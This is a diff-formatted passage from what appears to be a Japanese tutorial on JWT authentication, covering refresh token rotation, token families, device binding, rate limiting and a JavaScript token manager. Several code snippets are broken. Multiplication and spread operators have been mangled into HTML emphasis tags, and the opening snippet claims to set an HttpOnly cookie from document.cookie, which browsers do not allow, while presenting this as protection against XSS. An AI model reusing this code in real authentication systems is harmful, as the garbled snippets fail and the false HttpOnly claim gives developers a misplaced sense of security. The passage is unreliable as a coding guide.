+<p>                    const parts = token.split('.');</p>
+<p>                    const signature = parts[2];</p>
+<p>                    const headerPayload = parts.slice(0, 2).join('.');</p>
+                    
+<p>                    // 2. 署名部分をHttpOnly Cookieに</p>
+<p>                    document.cookie = <code>token_sig=${signature}; HttpOnly; Secure</code>;</p>
+                    
+<p>                    // 3. ヘッダーとペイロードをLocalStorageに</p>
+<p>                    localStorage.setItem('token_hp', headerPayload);</p>
+                    
+<p>                    // 4. リクエスト時に再結合</p>
+<p>                    const hp = localStorage.getItem('token_hp');</p>
+<p>                    // signature は Cookie から自動送信</p>
+<p>                    // サーバー側で結合して検証</p>
+<p>                    ''',</p>
+<p>                    'benefits': [</p>
+<p>                        'XSS攻撃では完全なトークンを取得できない',</p>
+<p>                        'CSRF攻撃では署名のみで無意味'</p>
+<p>                    ]</p>
+<p>                }</p>
+        
+<p>        return SecureCookieImplementation()</p>
+<p></code></pre></p><h3>5.2.2 トークン管理のベストプラクティス</h3><p><pre><code>python</p>
+<p>import time</p>
+<p>from datetime import datetime, timedelta</p>
+<p>from typing import Optional, Dict, Tuple</p><p>class TokenManagementBestPractices:</p>
+<p>    """トークン管理のベストプラクティス"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.security_config = {</p>
+<p>            'access_token_lifetime': 900,      # 15分</p>
+<p>            'refresh_token_lifetime': 604800,  # 7日</p>
+<p>            'refresh_threshold': 300,          # 5分前にリフレッシュ</p>
+<p>            'max_refresh_count': 10,           # リフレッシュ回数制限</p>
+<p>            'token_rotation': True             # トークンローテーション</p>
+<p>        }</p>
+    
+<p>    def implement_token_lifecycle(self):</p>
+<p>        """トークンライフサイクルの実装"""</p>
+        
+<p>        class TokenLifecycleManager:</p>
+<p>            def __init__(self, config):</p>
+<p>                self.config = config</p>
+<p>                self.token_store = {}  # 実際はRedis等を使用</p>
+                
+<p>            def issue_token_pair(self, user_id: str, device_id: Optional[str] = None) -> Dict:</p>
+<p>                """トークンペアの発行"""</p>
+                
+<p>                # アクセストークンの生成</p>
+<p>                access_payload = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'type': 'access',</p>
+<p>                    'iat': int(time.time()),</p>
+<p>                    'exp': int(time.time() + self.config['access_token_lifetime']),</p>
+<p>                    'jti': self._generate_jti()  # トークンID</p>
+<p>                }</p>
+                
+<p>                if device_id:</p>
+<p>                    access_payload['device_id'] = device_id</p>
+                
+<p>                access_token = jwt.encode(access_payload, self.secret, algorithm='HS256')</p>
+                
+<p>                # リフレッシュトークンの生成</p>
+<p>                refresh_payload = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'type': 'refresh',</p>
+<p>                    'iat': int(time.time()),</p>
+<p>                    'exp': int(time.time() + self.config['refresh_token_lifetime']),</p>
+<p>                    'jti': self._generate_jti(),</p>
+<p>                    'refresh_count': 0,</p>
+<p>                    'family_id': self._generate_family_id()  # トークンファミリー</p>
+<p>                }</p>
+                
+<p>                refresh_token = jwt.encode(refresh_payload, self.secret, algorithm='HS256')</p>
+                
+<p>                # リフレッシュトークンの保存（無効化用）</p>
+<p>                self._store_refresh_token(refresh_payload['jti'], refresh_payload)</p>
+                
+<p>                return {</p>
+<p>                    'access_token': access_token,</p>
+<p>                    'refresh_token': refresh_token,</p>
+<p>                    'token_type': 'Bearer',</p>
+<p>                    'expires_in': self.config['access_token_lifetime']</p>
+<p>                }</p>
+            
+<p>            def refresh_tokens(self, refresh_token: str) -> Optional[Dict]:</p>
+<p>                """トークンのリフレッシュ"""</p>
+                
+<p>                try:</p>
+<p>                    # リフレッシュトークンの検証</p>
+<p>                    payload = jwt.decode(refresh_token, self.secret, algorithms=['HS256'])</p>
+                    
+<p>                    # トークンタイプの確認</p>
+<p>                    if payload.get('type') != 'refresh':</p>
+<p>                        raise ValueError("Invalid token type")</p>
+                    
+<p>                    # 保存されているトークンとの照合</p>
+<p>                    stored_token = self._get_stored_token(payload['jti'])</p>
+<p>                    if not stored_token:</p>
+<p>                        # トークンが無効化されている</p>
+<p>                        self._handle_token_reuse(payload)</p>
+<p>                        return None</p>
+                    
+<p>                    # リフレッシュ回数のチェック</p>
+<p>                    if payload['refresh_count'] >= self.config['max_refresh_count']:</p>
+<p>                        self._revoke_token(payload['jti'])</p>
+<p>                        return None</p>
+                    
+<p>                    # 新しいトークンペアの生成</p>
+<p>                    new_tokens = self._generate_new_token_pair(payload)</p>
+                    
+<p>                    # トークンローテーション</p>
+<p>                    if self.config['token_rotation']:</p>
+<p>                        self._revoke_token(payload['jti'])</p>
+                    
+<p>                    return new_tokens</p>
+                    
+<p>                except jwt.ExpiredSignatureError:</p>
+<p>                    return None</p>
+<p>                except Exception as e:</p>
+<p>                    logging.error(f"Token refresh error: {e}")</p>
+<p>                    return None</p>
+            
+<p>            def _generate_new_token_pair(self, old_payload: Dict) -> Dict:</p>
+<p>                """新しいトークンペアの生成"""</p>
+                
+<p>                # 新しいアクセストークン</p>
+<p>                new_access = self.issue_token_pair(</p>
+<p>                    old_payload['user_id'],</p>
+<p>                    old_payload.get('device_id')</p>
+<p>                )</p>
+                
+<p>                # リフレッシュトークンの更新</p>
+<p>                new_refresh_payload = {</p>
+<p>                    <em></em>old_payload,</p>
+<p>                    'iat': int(time.time()),</p>
+<p>                    'exp': int(time.time() + self.config['refresh_token_lifetime']),</p>
+<p>                    'jti': self._generate_jti(),</p>
+<p>                    'refresh_count': old_payload['refresh_count'] + 1</p>
+<p>                }</p>
+                
+<p>                new_refresh_token = jwt.encode(</p>
+<p>                    new_refresh_payload, </p>
+<p>                    self.secret, </p>
+<p>                    algorithm='HS256'</p>
+<p>                )</p>
+                
+<p>                # 新しいリフレッシュトークンを保存</p>
+<p>                self._store_refresh_token(new_refresh_payload['jti'], new_refresh_payload)</p>
+                
+<p>                return {</p>
+<p>                    'access_token': new_access['access_token'],</p>
+<p>                    'refresh_token': new_refresh_token,</p>
+<p>                    'token_type': 'Bearer',</p>
+<p>                    'expires_in': self.config['access_token_lifetime']</p>
+<p>                }</p>
+            
+<p>            def _handle_token_reuse(self, payload: Dict):</p>
+<p>                """トークン再利用の検出時の処理"""</p>
+                
+<p>                # セキュリティアラート</p>
+<p>                logging.warning(</p>
+<p>                    f"Potential token theft detected for user {payload['user_id']}"</p>
+<p>                )</p>
+                
+<p>                # 同じファミリーのすべてのトークンを無効化</p>
+<p>                self._revoke_token_family(payload['family_id'])</p>
+                
+<p>                # ユーザーに通知</p>
+<p>                self._notify_user_security_alert(payload['user_id'])</p>
+            
+<p>            def implement_token_binding(self):</p>
+<p>                """トークンバインディングの実装"""</p>
+                
+<p>                return {</p>
+<p>                    'concept': 'トークンを特定のクライアントにバインド',</p>
+<p>                    'implementation': '''</p>
+<p>                    def create_bound_token(user_id: str, client_context: Dict):</p>
+<p>                        # クライアントフィンガープリント</p>
+<p>                        fingerprint = hashlib.sha256(</p>
+<p>                            f"{client_context['ip']}"</p>
+<p>                            f"{client_context['user_agent']}"</p>
+<p>                            f"{client_context['accept_language']}".encode()</p>
+<p>                        ).hexdigest()</p>
+                        
+<p>                        payload = {</p>
+<p>                            'user_id': user_id,</p>
+<p>                            'client_fingerprint': fingerprint,</p>
+<p>                            'exp': int(time.time() + 900)</p>
+<p>                        }</p>
+                        
+<p>                        return jwt.encode(payload, secret, algorithm='HS256')</p>
+                    
+<p>                    def verify_bound_token(token: str, client_context: Dict):</p>
+<p>                        payload = jwt.decode(token, secret, algorithms=['HS256'])</p>
+                        
+<p>                        # 現在のフィンガープリント</p>
+<p>                        current_fingerprint = calculate_fingerprint(client_context)</p>
+                        
+<p>                        # バインディングの検証</p>
+<p>                        if payload['client_fingerprint'] != current_fingerprint:</p>
+<p>                            raise SecurityError("Token binding mismatch")</p>
+                        
+<p>                        return payload</p>
+<p>                    ''',</p>
+<p>                    'benefits': [</p>
+<p>                        'トークンの盗難時の被害を限定',</p>
+<p>                        'クライアント固有のトークン'</p>
+<p>                    ],</p>
+<p>                    'considerations': [</p>
+<p>                        'IPアドレス変更への対応',</p>
+<p>                        'モバイルネットワークでの課題'</p>
+<p>                    ]</p>
+<p>                }</p>
+        
+<p>        return TokenLifecycleManager(self.security_config)</p>
+<p></code></pre></p><h3>5.2.3 クライアント側のトークン管理</h3><p><pre><code>python</p>
+<p>class ClientSideTokenManagement:</p>
+<p>    """クライアント側でのトークン管理実装"""</p>
+    
+<p>    def implement_secure_token_storage(self):</p>
+<p>        """セキュアなトークン保存の実装"""</p>
+        
+<p>        return {</p>
+<p>            'javascript_implementation': '''</p>
+<p>            class TokenManager {</p>
+<p>                constructor() {</p>
+<p>                    // トークンをメモリに保持</p>
+<p>                    this.accessToken = null;</p>
+<p>                    this.refreshPromise = null;</p>
+<p>                }</p>
+                
+<p>                // トークンの設定（メモリのみ）</p>
+<p>                setAccessToken(token) {</p>
+<p>                    this.accessToken = token;</p>
+                    
+<p>                    // 自動リフレッシュのスケジュール</p>
+<p>                    this.scheduleRefresh(token);</p>
+<p>                }</p>
+                
+<p>                // トークンの取得</p>
+<p>                async getAccessToken() {</p>
+<p>                    // 有効期限チェック</p>
+<p>                    if (this.isTokenExpired()) {</p>
+<p>                        await this.refreshAccessToken();</p>
+<p>                    }</p>
+                    
+<p>                    return this.accessToken;</p>
+<p>                }</p>
+                
+<p>                // トークンの有効期限チェック</p>
+<p>                isTokenExpired() {</p>
+<p>                    if (!this.accessToken) return true;</p>
+                    
+<p>                    try {</p>
+<p>                        // JWTペイロードをデコード（検証なし）</p>
+<p>                        const payload = JSON.parse(</p>
+<p>                            atob(this.accessToken.split('.')[1])</p>
+<p>                        );</p>
+                        
+<p>                        // 5分の余裕を持って判定</p>
+<p>                        const expiryTime = payload.exp * 1000;</p>
+<p>                        const currentTime = Date.now();</p>
+<p>                        const bufferTime = 5 <em> 60 </em> 1000; // 5分</p>
+                        
+<p>                        return currentTime >= (expiryTime - bufferTime);</p>
+<p>                    } catch (e) {</p>
+<p>                        return true;</p>
+<p>                    }</p>
+<p>                }</p>
+                
+<p>                // 自動リフレッシュのスケジュール</p>
+<p>                scheduleRefresh(token) {</p>
+<p>                    try {</p>
+<p>                        const payload = JSON.parse(atob(token.split('.')[1]));</p>
+<p>                        const expiryTime = payload.exp * 1000;</p>
+<p>                        const currentTime = Date.now();</p>
+<p>                        const refreshTime = expiryTime - currentTime - (5 <em> 60 </em> 1000);</p>
+                        
+<p>                        if (refreshTime > 0) {</p>
+<p>                            setTimeout(() => {</p>
+<p>                                this.refreshAccessToken();</p>
+<p>                            }, refreshTime);</p>
+<p>                        }</p>
+<p>                    } catch (e) {</p>
+<p>                        console.error('Failed to schedule refresh:', e);</p>
+<p>                    }</p>
+<p>                }</p>
+                
+<p>                // トークンのリフレッシュ</p>
+<p>                async refreshAccessToken() {</p>
+<p>                    // 重複リフレッシュを防ぐ</p>
+<p>                    if (this.refreshPromise) {</p>
+<p>                        return this.refreshPromise;</p>
+<p>                    }</p>
+                    
+<p>                    this.refreshPromise = fetch('/api/auth/refresh', {</p>
+<p>                        method: 'POST',</p>
+<p>                        credentials: 'include', // Cookie を含める</p>
+<p>                        headers: {</p>
+<p>                            'Content-Type': 'application/json'</p>
+<p>                        }</p>
+<p>                    })</p>
+<p>                    .then(response => {</p>
+<p>                        if (!response.ok) {</p>
+<p>                            throw new Error('Refresh failed');</p>
+<p>                        }</p>
+<p>                        return response.json();</p>
+<p>                    })</p>
+<p>                    .then(data => {</p>
+<p>                        this.setAccessToken(data.access_token);</p>
+<p>                        this.refreshPromise = null;</p>
+<p>                        return data.access_token;</p>
+<p>                    })</p>
+<p>                    .catch(error => {</p>
+<p>                        this.refreshPromise = null;</p>
+<p>                        // リフレッシュ失敗時は再ログインへ</p>
+<p>                        this.handleAuthFailure();</p>
+<p>                        throw error;</p>
+<p>                    });</p>
+                    
+<p>                    return this.refreshPromise;</p>
+<p>                }</p>
+                
+<p>                // APIリクエストのインターセプター</p>
+<p>                async makeAuthenticatedRequest(url, options = {}) {</p>
+<p>                    const token = await this.getAccessToken();</p>
+                    
+<p>                    const response = await fetch(url, {</p>
+<p>                        ...options,</p>
+<p>                        headers: {</p>
+<p>                            ...options.headers,</p>
+<p>                            'Authorization': <code>Bearer ${token}</code></p>
+<p>                        }</p>
+<p>                    });</p>
+                    
+<p>                    // 401エラーの場合はリフレッシュして再試行</p>
+<p>                    if (response.status === 401) {</p>
+<p>                        await this.refreshAccessToken();</p>
+<p>                        const newToken = await this.getAccessToken();</p>
+                        
+<p>                        return fetch(url, {</p>
+<p>                            ...options,</p>
+<p>                            headers: {</p>
+<p>                                ...options.headers,</p>
+<p>                                'Authorization': <code>Bearer ${newToken}</code></p>
+<p>                            }</p>
+<p>                        });</p>
+<p>                    }</p>
+                    
+<p>                    return response;</p>
+<p>                }</p>
+                
+<p>                // 認証失敗時の処理</p>
+<p>                handleAuthFailure() {</p>
+<p>                    // トークンをクリア</p>
+<p>                    this.accessToken = null;</p>
+                    
+<p>                    // ログインページへリダイレクト</p>
+<p>                    window.location.href = '/login';</p>
+<p>                }</p>
+<p>            }</p>
+            
+<p>            // シングルトンインスタンス</p>
+<p>            const tokenManager = new TokenManager();</p>
+<p>            export default tokenManager;</p>
+<p>            ''',</p>
+            
+<p>            'axios_interceptor': '''</p>
+<p>            // Axios インターセプターの実装</p>
+<p>            import axios from 'axios';</p>
+<p>            import tokenManager from './tokenManager';</p>
+            
+<p>            // リクエストインターセプター</p>
+<p>            axios.interceptors.request.use(</p>
+<p>                async (config) => {</p>
+<p>                    const token = await tokenManager.getAccessToken();</p>
+<p>                    if (token) {</p>
+<p>                        config.headers.Authorization = <code>Bearer ${token}</code>;</p>
+<p>                    }</p>
+<p>                    return config;</p>
+<p>                },</p>
+<p>                (error) => {</p>
+<p>                    return Promise.reject(error);</p>
+<p>                }</p>
+<p>            );</p>
+            
+<p>            // レスポンスインターセプター</p>
+<p>            axios.interceptors.response.use(</p>
+<p>                (response) => response,</p>
+<p>                async (error) => {</p>
+<p>                    const originalRequest = error.config;</p>
+                    
+<p>                    if (error.response?.status === 401 && !originalRequest._retry) {</p>
+<p>                        originalRequest._retry = true;</p>
+                        
+<p>                        try {</p>
+<p>                            await tokenManager.refreshAccessToken();</p>
+<p>                            const token = await tokenManager.getAccessToken();</p>
+<p>                            originalRequest.headers.Authorization = <code>Bearer ${token}</code>;</p>
+<p>                            return axios(originalRequest);</p>
+<p>                        } catch (refreshError) {</p>
+<p>                            tokenManager.handleAuthFailure();</p>
+<p>                            return Promise.reject(refreshError);</p>
+<p>                        }</p>
+<p>                    }</p>
+                    
+<p>                    return Promise.reject(error);</p>
+<p>                }</p>
+<p>            );</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>5.3 リフレッシュトークンの設計 - セキュリティとUXの両立</h2><h3>5.3.1 なぜリフレッシュトークンが必要なのか</h3><p><pre><code>python</p>
+<p>class RefreshTokenRationale:</p>
+<p>    """リフレッシュトークンの必要性"""</p>
+    
+<p>    def explain_refresh_token_need(self):</p>
+<p>        """リフレッシュトークンがなぜ必要かを説明"""</p>
+        
+<p>        return {</p>
+<p>            'problem_without_refresh': {</p>
+<p>                'long_lived_access_token': {</p>
+<p>                    'risk': 'トークンが盗まれた場合の被害期間が長い',</p>
+<p>                    'example': '24時間有効なトークン → 最大24時間の不正アクセス'</p>
+<p>                },</p>
+                
+<p>                'short_lived_access_token': {</p>
+<p>                    'issue': '頻繁な再ログインが必要',</p>
+<p>                    'ux_impact': 'ユーザー体験の著しい低下',</p>
+<p>                    'example': '15分ごとにパスワード入力'</p>
+<p>                },</p>
+                
+<p>                'dilemma': 'セキュリティとユーザビリティのトレードオフ'</p>
+<p>            },</p>
+            
+<p>            'refresh_token_solution': {</p>
+<p>                'concept': '短命なアクセストークン + 長命なリフレッシュトークン',</p>
+                
+<p>                'benefits': {</p>
+<p>                    'security': [</p>
+<p>                        'アクセストークンは短命（15分程度）',</p>
+<p>                        '頻繁に使用されるトークンの露出リスクを最小化',</p>
+<p>                        'リフレッシュトークンは限定的な用途'</p>
+<p>                    ],</p>
+                    
+<p>                    'usability': [</p>
+<p>                        'ユーザーは長期間ログイン状態を維持',</p>
+<p>                        'シームレスなトークン更新',</p>
+<p>                        'バックグラウンドでの自動更新'</p>
+<p>                    ]</p>
+<p>                },</p>
+                
+<p>                'separation_of_concerns': {</p>
+<p>                    'access_token': {</p>
+<p>                        'purpose': 'APIアクセス',</p>
+<p>                        'lifetime': '5-15分',</p>
+<p>                        'usage': '頻繁',</p>
+<p>                        'storage': 'メモリ推奨'</p>
+<p>                    },</p>
+                    
+<p>                    'refresh_token': {</p>
+<p>                        'purpose': '新しいアクセストークンの取得',</p>
+<p>                        'lifetime': '7-30日',</p>
+<p>                        'usage': 'まれ（アクセストークン更新時のみ）',</p>
+<p>                        'storage': 'HttpOnly Cookie推奨'</p>
+<p>                    }</p>
+<p>                }</p>
+<p>            }</p>
+<p>        }</p>
+<p></code></pre></p><h3>5.3.2 セキュアなリフレッシュトークン実装</h3><p><pre><code>python</p>
+<p>import uuid</p>
+<p>import hashlib</p>
+<p>from typing import Optional, Dict, List</p><p>class SecureRefreshTokenImplementation:</p>
+<p>    """セキュアなリフレッシュトークンの実装"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.refresh_token_store = {}  # 実際はRedisやDBを使用</p>
+<p>        self.security_config = {</p>
+<p>            'rotation_enabled': True,</p>
+<p>            'family_tracking': True,</p>
+<p>            'device_binding': True,</p>
+<p>            'rate_limiting': True,</p>
+<p>            'anomaly_detection': True</p>
+<p>        }</p>
+    
+<p>    def implement_refresh_token_rotation(self):</p>
+<p>        """リフレッシュトークンローテーション"""</p>
+        
+<p>        class RefreshTokenRotation:</p>
+<p>            def __init__(self):</p>
+<p>                self.token_families = {}  # family_id -> token_list</p>
+            
+<p>            def create_token_family(self, user_id: str) -> str:</p>
+<p>                """新しいトークンファミリーの作成"""</p>
+                
+<p>                family_id = str(uuid.uuid4())</p>
+                
+<p>                initial_token = {</p>
+<p>                    'jti': str(uuid.uuid4()),</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'family_id': family_id,</p>
+<p>                    'created_at': time.time(),</p>
+<p>                    'parent_jti': None,</p>
+<p>                    'children_jti': [],</p>
+<p>                    'status': 'active'</p>
+<p>                }</p>
+                
+<p>                # ファミリーの初期化</p>
+<p>                self.token_families[family_id] = [initial_token['jti']]</p>
+                
+<p>                # トークンの保存</p>
+<p>                self._store_token(initial_token)</p>
+                
+<p>                return self._encode_refresh_token(initial_token)</p>
+            
+<p>            def rotate_token(self, current_token: str) -> Optional[str]:</p>
+<p>                """トークンのローテーション"""</p>
+                
+<p>                # 現在のトークンをデコード</p>
+<p>                token_data = self._decode_refresh_token(current_token)</p>
+<p>                if not token_data:</p>
+<p>                    return None</p>
+                
+<p>                # トークンの状態確認</p>
+<p>                stored_token = self._get_stored_token(token_data['jti'])</p>
+<p>                if not stored_token or stored_token['status'] != 'active':</p>
+<p>                    # トークンが無効または既に使用済み</p>
+<p>                    self._handle_suspicious_activity(token_data)</p>
+<p>                    return None</p>
+                
+<p>                # 新しいトークンの生成</p>
+<p>                new_token = {</p>
+<p>                    'jti': str(uuid.uuid4()),</p>
+<p>                    'user_id': token_data['user_id'],</p>
+<p>                    'family_id': token_data['family_id'],</p>
+<p>                    'created_at': time.time(),</p>
+<p>                    'parent_jti': token_data['jti'],</p>
+<p>                    'children_jti': [],</p>
+<p>                    'status': 'active'</p>
+<p>                }</p>
+                
+<p>                # 親トークンを無効化</p>
+<p>                stored_token['status'] = 'rotated'</p>
+<p>                stored_token['children_jti'].append(new_token['jti'])</p>
+<p>                self._update_token(stored_token)</p>
+                
+<p>                # 新しいトークンを保存</p>
+<p>                self._store_token(new_token)</p>
+                
+<p>                # ファミリーリストを更新</p>
+<p>                self.token_families[token_data['family_id']].append(new_token['jti'])</p>
+                
+<p>                return self._encode_refresh_token(new_token)</p>
+            
+<p>            def _handle_suspicious_activity(self, token_data: Dict):</p>
+<p>                """不審なアクティビティの処理"""</p>
+                
+<p>                logging.warning(</p>
+<p>                    f"Suspicious refresh token usage detected for user {token_data['user_id']}"</p>
+<p>                )</p>
+                
+<p>                # トークンファミリー全体を無効化</p>
+<p>                family_id = token_data['family_id']</p>
+<p>                if family_id in self.token_families:</p>
+<p>                    for token_jti in self.token_families[family_id]:</p>
+<p>                        stored_token = self._get_stored_token(token_jti)</p>
+<p>                        if stored_token:</p>
+<p>                            stored_token['status'] = 'revoked_security'</p>
+<p>                            self._update_token(stored_token)</p>
+                
+<p>                # セキュリティアラート</p>
+<p>                self._send_security_alert(token_data['user_id'], {</p>
+<p>                    'event': 'refresh_token_reuse',</p>
+<p>                    'family_id': family_id,</p>
+<p>                    'timestamp': time.time()</p>
+<p>                })</p>
+        
+<p>        return RefreshTokenRotation()</p>
+    
+<p>    def implement_device_binding(self):</p>
+<p>        """デバイスバインディングの実装"""</p>
+        
+<p>        class DeviceBoundRefreshToken:</p>
+<p>            def __init__(self):</p>
+<p>                self.device_registry = {}</p>
+            
+<p>            def create_device_bound_token(self, user_id: str, device_info: Dict) -> str:</p>
+<p>                """デバイスにバインドされたトークンの作成"""</p>
+                
+<p>                # デバイスフィンガープリント</p>
+<p>                device_fingerprint = self._calculate_device_fingerprint(device_info)</p>
+                
+<p>                # デバイスの登録</p>
+<p>                device_id = str(uuid.uuid4())</p>
+<p>                self.device_registry[device_id] = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'fingerprint': device_fingerprint,</p>
+<p>                    'registered_at': time.time(),</p>
+<p>                    'last_seen': time.time(),</p>
+<p>                    'device_info': {</p>
+<p>                        'user_agent': device_info.get('user_agent'),</p>
+<p>                        'platform': device_info.get('platform'),</p>
+<p>                        'app_version': device_info.get('app_version')</p>
+<p>                    }</p>
+<p>                }</p>
+                
+<p>                # トークンにデバイス情報を含める</p>
+<p>                token_data = {</p>
+<p>                    'user_id': user_id,</p>
+<p>                    'device_id': device_id,</p>
+<p>                    'device_fingerprint': device_fingerprint,</p>
+<p>                    'exp': int(time.time() + 30 <em> 24 </em> 3600)  # 30日</p>
+<p>                }</p>
+                
+<p>                return jwt.encode(token_data, self.secret, algorithm='HS256')</p>
+            
+<p>            def verify_device_binding(self, token: str, current_device_info: Dict) -> bool:</p>
+<p>                """デバイスバインディングの検証"""</p>
+                
+<p>                try:</p>
+<p>                    payload = jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+                    
+<p>                    # 現在のデバイスフィンガープリント</p>
+<p>                    current_fingerprint = self._calculate_device_fingerprint(</p>
+<p>                        current_device_info</p>
+<p>                    )</p>
+                    
+<p>                    # フィンガープリントの比較（完全一致は求めない）</p>
+<p>                    similarity = self._calculate_fingerprint_similarity(</p>
+<p>                        payload['device_fingerprint'],</p>
+<p>                        current_fingerprint</p>
+<p>                    )</p>
+                    
+<p>                    # 類似度が閾値以上なら許可</p>
+<p>                    if similarity >= 0.8:  # 80%以上の一致</p>
+<p>                        # デバイス情報を更新</p>
+<p>                        self._update_device_info(payload['device_id'], current_device_info)</p>
+<p>                        return True</p>
+                    
+<p>                    # 新しいデバイスからのアクセス</p>
+<p>                    return self._handle_new_device_access(payload, current_device_info)</p>
+                    
+<p>                except Exception as e:</p>
+<p>                    logging.error(f"Device binding verification failed: {e}")</p>
+<p>                    return False</p>
+            
+<p>            def _calculate_device_fingerprint(self, device_info: Dict) -> str:</p>
+<p>                """デバイスフィンガープリントの計算"""</p>
+                
+<p>                # 複数の要素を組み合わせる</p>
+<p>                fingerprint_data = {</p>
+<p>                    'user_agent': device_info.get('user_agent', ''),</p>
+<p>                    'accept_language': device_info.get('accept_language', ''),</p>
+<p>                    'screen_resolution': device_info.get('screen_resolution', ''),</p>
+<p>                    'timezone_offset': device_info.get('timezone_offset', 0),</p>
+<p>                    'platform': device_info.get('platform', ''),</p>
+<p>                    'hardware_concurrency': device_info.get('hardware_concurrency', 0)</p>
+<p>                }</p>
+                
+<p>                # 安定したハッシュを生成</p>
+<p>                fingerprint_str = json.dumps(fingerprint_data, sort_keys=True)</p>
+<p>                return hashlib.sha256(fingerprint_str.encode()).hexdigest()</p>
+        
+<p>        return DeviceBoundRefreshToken()</p>
+    
+<p>    def implement_rate_limiting(self):</p>
+<p>        """レート制限の実装"""</p>
+        
+<p>        class RefreshTokenRateLimiter:</p>
+<p>            def __init__(self):</p>
+<p>                self.limits = {</p>
+<p>                    'per_minute': 5,</p>
+<p>                    'per_hour': 20,</p>
+<p>                    'per_day': 100</p>
+<p>                }</p>
+<p>                self.usage_history = {}  # user_id -> usage_list</p>
+            
+<p>            def check_rate_limit(self, user_id: str) -> Tuple[bool, Optional[str]]:</p>
+<p>                """レート制限のチェック"""</p>
+                
+<p>                current_time = time.time()</p>
+                
+<p>                # ユーザーの使用履歴を取得</p>
+<p>                if user_id not in self.usage_history:</p>
+<p>                    self.usage_history[user_id] = []</p>
+                
+<p>                usage_list = self.usage_history[user_id]</p>
+                
+<p>                # 期限切れのエントリを削除</p>
+<p>                usage_list = [</p>
+<p>                    ts for ts in usage_list </p>
+<p>                    if current_time - ts < 86400  # 24時間以内</p>
+<p>                ]</p>
+                
+<p>                # 各時間枠でのチェック</p>
+<p>                checks = [</p>
+<p>                    (60, self.limits['per_minute'], '1分'),</p>
+<p>                    (3600, self.limits['per_hour'], '1時間'),</p>
+<p>                    (86400, self.limits['per_day'], '1日')</p>
+<p>                ]</p>
+                
+<p>                for window, limit, period_name in checks:</p>
+<p>                    recent_usage = [</p>
+<p>                        ts for ts in usage_list </p>
+<p>                        if current_time - ts < window</p>
+<p>                    ]</p>
+                    
+<p>                    if len(recent_usage) >= limit:</p>
+<p>                        return False, f"{period_name}あたりの制限（{limit}回）を超過"</p>
+                
+<p>                # 使用を記録</p>
+<p>                usage_list.append(current_time)</p>
+<p>                self.usage_history[user_id] = usage_list</p>
+                
+<p>                return True, None</p>
+            
+<p>            def implement_exponential_backoff(self):</p>
+<p>                """指数バックオフの実装"""</p>
+                
+<p>                return {</p>
+<p>                    'concept': '連続失敗時の待機時間を指数的に増加',</p>
+<p>                    'implementation': '''</p>
+<p>                    def calculate_backoff_time(failure_count: int) -> int:</p>
+<p>                        """バックオフ時間の計算"""</p>
+                        
+<p>                        base_delay = 1  # 1秒</p>
+<p>                        max_delay = 300  # 5分</p>
+                        
+<p>                        # 2^n * base_delay（最大値でキャップ）</p>
+<p>                        delay = min(base_delay <em> (2 </em>* failure_count), max_delay)</p>
+                        
+<p>                        # ジッターを追加（サンダリングハード問題対策）</p>
+<p>                        jitter = random.uniform(0, delay * 0.1)</p>
+                        
+<p>                        return delay + jitter</p>
+<p>                    ''',</p>
+<p>                    'benefits': [</p>
+<p>                        'ブルートフォース攻撃の緩和',</p>
+<p>                        'システム負荷の軽減',</p>
+<p>                        '正当なユーザーへの影響最小化'</p>
+<p>                    ]</p>
+<p>                }</p>
+        
+<p>        return RefreshTokenRateLimiter()</p>
+<p></code></pre></p><h3>5.3.3 リフレッシュトークンのセキュリティパターン</h3><p><pre><code>python</p>
+<p>class RefreshTokenSecurityPatterns:</p>
+<p>    """リフレッシュトークンのセキュリティパターン"""</p>
+    
+<p>    def implement_refresh_token_patterns(self):</p>
+<p>        """各種セキュリティパターンの実装"""</p>
+        
+<p>        return {</p>
+<p>            'pattern_1_strict_rotation': {</p>
+<p>                'description': '厳格なローテーション（使い捨て）',</p>
+<p>                'implementation': '''</p>
+<p>                class StrictRotation:</p>
+<p>                    def refresh(self, token):</p>
+<p>                        # トークンは一度しか使えない</p>
+<p>                        if self.is_token_used(token):</p>
+<p>                            # セキュリティ違反 - 全トークン無効化</p>
+<p>                            self.revoke_all_tokens(token.user_id)</p>
+<p>                            raise SecurityError("Token reuse detected")</p>
+                        
+<p>                        # 新しいトークンペアを発行</p>
+<p>                        new_tokens = self.issue_new_tokens(token.user_id)</p>
+                        
+<p>                        # 古いトークンを無効化</p>
+<p>                        self.mark_token_used(token)</p>
+                        
+<p>                        return new_tokens</p>
+<p>                ''',</p>
+<p>                'pros': '最高のセキュリティ',</p>
+<p>                'cons': 'ネットワークエラー時の問題'</p>
+<p>            },</p>
+            
+<p>            'pattern_2_grace_period': {</p>
+<p>                'description': '猶予期間付きローテーション',</p>
+<p>                'implementation': '''</p>
+<p>                class GracePeriodRotation:</p>
+<p>                    def __init__(self):</p>
+<p>                        self.grace_period = 60  # 60秒</p>
+                    
+<p>                    def refresh(self, token):</p>
+<p>                        token_info = self.get_token_info(token)</p>
+                        
+<p>                        if token_info['status'] == 'used':</p>
+<p>                            # 猶予期間内かチェック</p>
+<p>                            if time.time() - token_info['used_at'] < self.grace_period:</p>
+<p>                                # 同じ新トークンを返す</p>
+<p>                                return token_info['new_tokens']</p>
+<p>                            else:</p>
+<p>                                # 猶予期間外 - セキュリティ違反</p>
+<p>                                self.handle_security_violation(token)</p>
+                        
+<p>                        # 新しいトークンを発行</p>
+<p>                        new_tokens = self.issue_new_tokens(token.user_id)</p>
+                        
+<p>                        # 使用済みとしてマーク（猶予期間付き）</p>
+<p>                        self.mark_token_used(token, new_tokens)</p>
+                        
+<p>                        return new_tokens</p>
+<p>                ''',</p>
+<p>                'pros': 'ネットワークエラーに対する耐性',</p>
+<p>                'cons': '短時間の脆弱性ウィンドウ'</p>
+<p>            },</p>
+            
+<p>            'pattern_3_sliding_sessions': {</p>
+<p>                'description': 'スライディングセッション',</p>
+<p>                'implementation': '''</p>
+<p>                class SlidingSessions:</p>
+<p>                    def refresh(self, token):</p>
+<p>                        # アクティビティに基づいて有効期限を延長</p>
+<p>                        if self.is_active_user(token.user_id):</p>
+<p>                            # 有効期限を延長</p>
+<p>                            new_expiry = time.time() + self.active_user_ttl</p>
